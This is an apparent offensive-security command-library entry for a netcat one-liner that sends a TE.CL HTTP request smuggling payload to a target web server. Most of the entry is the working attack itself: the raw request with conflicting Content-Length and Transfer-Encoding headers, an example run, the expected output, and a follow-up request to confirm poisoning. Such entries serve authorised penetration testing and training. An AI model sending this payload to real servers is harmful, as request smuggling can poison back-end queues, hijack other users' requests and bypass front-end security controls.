---
type: command
executor: bash
data: >-
  echo -e "POST / HTTP/1.1\r\nHost: $_TARGET\r\nContent-Length:
  3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n" | nc
  $_TARGET 80
tags:
  - request-smuggling
  - te-cl
platforms:
  - Linux
verified: true
validated: true
---

# nc-send-basic-te-cl-smuggling-request

## Command

```bash
echo -e "POST / HTTP/1.1\r\nHost: $_TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n" | nc $_TARGET 80
```

## Description

This command sends a basic TE.CL HTTP Request Smuggling payload using netcat (nc) to a target web server. It exploits parsing differences by including both Content-Length and Transfer-Encoding: chunked headers, smuggling the word "SMUGGLED" into the next request's body on the back-end server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET | Target hostname or IP (e.g., vulnerable-website.com) | Yes |
| 80 | Target port (default HTTP) | Yes |

## Examples

### Basic Usage

```bash
echo -e "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n" | nc example.com 80
```

### Advanced Usage

For HTTPS, use nc with stunnel or openssl s_client, or switch to curl for easier TLS handling.

## Expected Output

HTTP/1.1 200 OK
Date: ...
Server: ...

(empty body or standard response)

No immediate error, but follow with a POST request (e.g., curl -X POST -d "test=1" http://$_TARGET/) and inspect if the response includes "SMUGGLEDtest=1" or similar poisoning.

## Related

- [[procedures/TE-CL-Request-Smuggling]]
- [[codes/basic-te-cl-smuggling-http-payload]]
